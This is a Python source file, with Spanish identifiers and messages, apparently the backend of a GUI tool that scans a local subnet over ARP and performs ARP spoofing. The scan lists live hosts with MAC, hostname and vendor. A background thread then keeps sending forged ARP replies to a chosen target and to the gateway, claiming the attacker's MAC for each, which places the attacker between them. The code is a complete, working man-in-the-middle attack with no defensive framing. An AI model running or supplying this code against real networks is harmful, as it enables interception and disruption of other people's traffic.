import socket
import subprocess
import time
import threading
import ipaddress
from scapy.all import ARP, Ether, srp, send
from getmac import get_mac_address

try:
    from mac_vendor_lookup import MacLookup
    vendor_lookup = MacLookup()
    vendor_lookup.update_vendors()
except ImportError:
    vendor_lookup = None

mac_atacante = get_mac_address()
ip_puerta_enlace = None
ataque_en_curso = False
scan_in_progress = False

def init_gateway():
    global ip_puerta_enlace
    try:
        result = subprocess.run(["netstat", "-rn"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if line.startswith("0.0.0.0"):
                parts = line.split()
                if len(parts) >= 3:
                    ip_puerta_enlace = parts[2]
                    break
    except Exception as e:
        print(f"Error al obtener puerta de enlace: {e}")

def obtener_mac(ip):
    try:
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=1, verbose=0)
        for _, r in ans:
            return r.hwsrc
    except:
        return None
    return None

def start_spoof(ip_objetivo, callback):
    global ataque_en_curso
    ataque_en_curso = True
    thread = threading.Thread(target=_spoof_loop, args=(ip_objetivo, callback), daemon=True)
    thread.start()

def stop_spoof():
    global ataque_en_curso
    ataque_en_curso = False

def _spoof_loop(ip_objetivo, callback):
    global ip_puerta_enlace
    mac_obj = obtener_mac(ip_objetivo)
    if not mac_obj:
        callback(f"No se pudo obtener MAC para {ip_objetivo}\n")
        return

    callback(f"MAC de {ip_objetivo}: {mac_obj}\n")
    pkt_obj = ARP(pdst=ip_objetivo, hwdst=mac_obj, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
    pkt_gate = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

    while ataque_en_curso:
        send(pkt_obj, verbose=0)
        send(pkt_gate, verbose=0)
        callback(f"Enviando paquetes falsos a {ip_objetivo}...\n")
        time.sleep(2)

def scan_network(subnet, callback_row, callback_status, callback_progress):
    global scan_in_progress
    scan_in_progress = True
    callback_status("Estado: Iniciando escaneo...")

    try:
        net = ipaddress.ip_network(subnet, strict=False)
    except ValueError:
        callback_status("Subred inválida.")
        scan_in_progress = False
        return

    total = net.num_addresses - 2  # excluyendo gateway y broadcast
    count = 0

    for ip in net.hosts():
        if not scan_in_progress:
            break
        ip_str = str(ip)
        mac = obtener_mac(ip_str)
        count += 1
        callback_progress(count, total)
        if mac:
            try:
                hostname = socket.gethostbyaddr(ip_str)[0]
            except:
                hostname = "-"
            vendor = vendor_lookup.lookup(mac) if vendor_lookup else "-"
            callback_row(ip_str, mac, hostname, vendor)

    callback_status(f"Escaneo terminado: {count} direcciones escaneadas.")
    scan_in_progress = False

def stop_scan():
    global scan_in_progress
    scan_in_progress = False
